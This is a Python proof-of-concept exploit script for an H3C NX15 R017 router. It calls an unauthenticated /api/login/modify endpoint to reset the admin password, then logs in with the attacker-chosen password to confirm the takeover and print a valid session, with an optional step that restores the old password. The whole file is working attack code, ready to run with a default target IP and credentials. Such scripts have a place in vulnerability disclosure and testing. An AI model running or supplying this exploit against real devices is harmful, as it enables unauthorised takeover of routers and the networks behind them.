#!/usr/bin/env python3
import argparse
import json
import sys
from typing import Optional

import requests


def post_json(base: str, path: str, data: dict, headers: Optional[dict] = None, timeout: int = 10):
    url = base.rstrip('/') + path
    h = {'Content-Type': 'application/json'}
    if headers:
        h.update(headers)
    r = requests.post(url, data=json.dumps(data), headers=h, timeout=timeout)
    try:
        body = r.json()
    except Exception:
        body = {'raw': r.text}
    return r.status_code, body


def login(base: str, username: str, password: str):
    code, body = post_json(base, '/api/login/auth', {'username': username, 'password': password})
    return code, body


def unauth_change_password(base: str, new_password: str):
    code, body = post_json(base, '/api/login/modify', {'newPass': new_password})
    return code, body


def main():
    ap = argparse.ArgumentParser(description='H3C NX15 R017 pre-auth password takeover via /api/login/modify')
    ap.add_argument('--base', default='http://192.168.8.1', help='Target base URL, e.g. http://192.168.8.1')
    ap.add_argument('--username', default='admin', help='Login username to verify takeover')
    ap.add_argument('--old-password', default='admin123', help='Known current password for baseline / restoration')
    ap.add_argument('--new-password', default='TmpPass123!', help='Password to set without authentication')
    ap.add_argument('--restore', action='store_true', help='Restore the old password after proving takeover')
    args = ap.parse_args()

    print(f'[*] Target: {args.base}')
    print(f'[*] Username: {args.username}')
    print(f'[*] Old password: {args.old_password}')
    print(f'[*] New password: {args.new_password}')

    print('[*] Step 1: Baseline login with old password')
    sc, body = login(args.base, args.username, args.old_password)
    print(f'    HTTP {sc} -> {body}')
    if body.get('code') != 0:
        print('[!] Baseline login failed; continuing anyway, because the vulnerability itself is unauthenticated.')

    print('[*] Step 2: Unauthenticated password change via /api/login/modify')
    sc, body = unauth_change_password(args.base, args.new_password)
    print(f'    HTTP {sc} -> {body}')
    if body.get('code') != 0:
        print('[!] Exploit failed.')
        return 1

    print('[*] Step 3: Verify takeover by logging in with the attacker-chosen password')
    sc, body = login(args.base, args.username, args.new_password)
    print(f'    HTTP {sc} -> {body}')
    if body.get('code') != 0 or 'session' not in body.get('data', {}):
        print('[!] Verification failed; no valid session returned.')
        return 2

    session = body['data']['session']
    print(f'[+] SUCCESS: password changed without authentication, valid session = {session}')

    if args.restore:
        print('[*] Step 4: Restoring original password using the same unauthenticated endpoint')
        sc, body = unauth_change_password(args.base, args.old_password)
        print(f'    HTTP {sc} -> {body}')
        sc2, body2 = login(args.base, args.username, args.old_password)
        print(f'    Verify restore HTTP {sc2} -> {body2}')
        if body2.get('code') == 0:
            print('[+] Restore succeeded.')
        else:
            print('[!] Restore may have failed; check target manually.')

    return 0


if __name__ == '__main__':
    try:
        raise SystemExit(main())
    except requests.RequestException as e:
        print(f'[!] Network error: {e}')
        raise SystemExit(3)
